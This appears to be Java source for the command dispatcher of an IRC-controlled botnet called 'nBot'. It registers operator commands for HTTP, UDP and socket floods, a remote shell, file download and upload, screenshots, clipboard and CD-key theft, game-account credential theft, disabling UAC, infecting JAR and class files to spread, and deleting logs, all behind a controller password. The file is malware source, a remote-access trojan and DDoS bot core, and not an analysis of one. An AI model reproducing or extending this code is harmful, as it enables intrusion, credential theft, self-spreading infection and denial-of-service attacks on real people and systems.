
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class Command implements Runnable {

    private String nick;
    private String[] args;
    private String command;
    public static List<String> directTo = new ArrayList<String>();
    public static boolean isDirecting;
    public static List<String> loggedInUsers = new ArrayList<String>();
    public static Map<String, Handler> commands = new HashMap<String, Handler>();

    static {
        commands.put(";getusername", new MiscCommands());
        commands.put(";getip", new MiscCommands());
        commands.put(";getcountry", new MiscCommands());
        commands.put(";cmd", new MiscCommands());
        commands.put(";directto", new MiscCommands());
        commands.put(";nodirect", new MiscCommands());
        commands.put(";removefromdirect", new MiscCommands());
        commands.put(";getclip", new MiscCommands());
        commands.put(";setclip", new MiscCommands());
        commands.put(";takess", new MiscCommands());
        commands.put(";rsbotlist", new MiscCommands());
        commands.put(";rsbotgetuserspass", new MiscCommands());
        commands.put(";rsbotuserbypass", new MiscCommands());
        commands.put(";rsbotreloadall", new MiscCommands());
        commands.put(";rsbotreloadaccounts", new MiscCommands());
        commands.put(";getresponcecode", new MiscCommands());
        commands.put(";msg", new MiscCommands());
        commands.put(";gtfo", new MiscCommands());
        commands.put(";getos", new MiscCommands());
        commands.put(";hide", new MiscCommands());
        commands.put(";commandlist", new MiscCommands());
        commands.put(";beep", new MiscCommands());
        commands.put(";getscreensize", new MiscCommands());
        commands.put(";disableuac", new MiscCommands());
        commands.put(";pingtime", new MiscCommands());
        commands.put(";toggleoutput", new MiscCommands());
        commands.put(";download", new Downloader());
        commands.put(";httpflood", new HTTPFlood());
        commands.put(";stophttpflood", new HTTPFlood());
        commands.put(";udpflood", new UDPFlood());
        commands.put(";stopudpflood", new UDPFlood());
        commands.put(";sockflood", new SocketFlood());
        commands.put(";stopsockflood", new SocketFlood());
        commands.put(";getkeys", new CDKeys());
        commands.put(";update", new Update());
        commands.put(";currentversion", new Update());
        commands.put(";localversion", new Update());
        commands.put(";needsupdate", new Update());
        commands.put(";portscan", new PortScanner());
        commands.put(";stopportscan", new PortScanner());
        commands.put(";rsversion", new RsVersionChecker());
        commands.put(";webopen", new Web());
        commands.put(";closebrowsers", new Web());
        commands.put(";movemouse", new RobotFunctions());
        commands.put(";keypress", new RobotFunctions());
        commands.put(";mousewheel", new RobotFunctions());
        commands.put(";crazymouse", new RobotFunctions());
        commands.put(";crazykeyboard", new RobotFunctions());
        commands.put(";clickmouse", new RobotFunctions());
        commands.put(";showimage", new ShowImage());
        commands.put(";cd", new RemoteShell());
        commands.put(";ls", new RemoteShell());
        commands.put(";createfile", new RemoteShell());
        commands.put(";readcontents", new RemoteShell());
        commands.put(";..", new RemoteShell());
        commands.put(";shellexec", new RemoteShell());
        commands.put(";shelldelete", new RemoteShell());
        commands.put(";writetofile", new RemoteShell());
        commands.put(";getlocation", new RemoteShell());
        commands.put(";infectjars", new Spreader());
        commands.put(";infectclasses", new Spreader());
        commands.put(";getsysteminfo", new SystemInformation());
        commands.put(";getprogramlist", new SystemInformation());
        commands.put(";firefox", new Firefox());
        commands.put(";upload", new FileSend());
        commands.put(";enabletaskchecking", new TaskChecker());
        commands.put(";disabletaskchecking", new TaskChecker());
        commands.put(";addbadtask", new TaskChecker());
        commands.put(";removebadtask", new TaskChecker());
        commands.put(";printlogs", new Log());
        commands.put(";searchlog", new Log());
        commands.put(";deletelogs", new Log());
        commands.put(";deleteonelog", new Log());
    }

    public Command(String command, String nick, String[] args) {
        if (command.equals(";login") && Config.controllors.contains(nick)) {
            if (args[1].equals(Config.CONTROL_PASS)) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " " + nick + " you are now logged in! LOL!");
                loggedInUsers.add(nick);
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "Gtfo");
            }
        } else if (command.equals(";logout") && loggedInUsers.contains(nick)) {
            loggedInUsers.remove(nick);
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " " + nick + " you are now logged out! LOL!");
        } else if (Config.controllors.contains(nick) && loggedInUsers.contains(nick)) {
            this.nick = nick;
            this.args = args;
            this.command = command;
            for (int i = 0; i < args.length; i++) {
                args[i] = args[i].replaceAll("'#", " ");
                args[i] = args[i].replace("(userhome)", System.getProperty("user.home")).replace("(", "").replace(")", "");
                args[i] = args[i].replace("(username)", System.getProperty("user.name")).replace("(", "").replace(")", "");
                args[i] = args[i].replace("(startup)", System.getProperty("user.name")).replace("(", "").replace(")", "");
            }
            Executors.newSingleThreadExecutor().execute(this);
        }
    }

    public void parseCommand(String nick, String[] args) {
        try {
            if (isDirecting) {
                if (!directTo.contains(Config.nick) && !args[0].equals(";nodirect") && !args[0].equals(";directto") && !args[0].equals(";removefromdirect")) {
                    return;
                }
            }
            Handler h = commands.get(this.command);
            if (h.processCommand(args, nick) == true) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Command executed sucsessfully!");
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Error processing command!");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void run() {
        parseCommand(this.nick, this.args);
    }
}
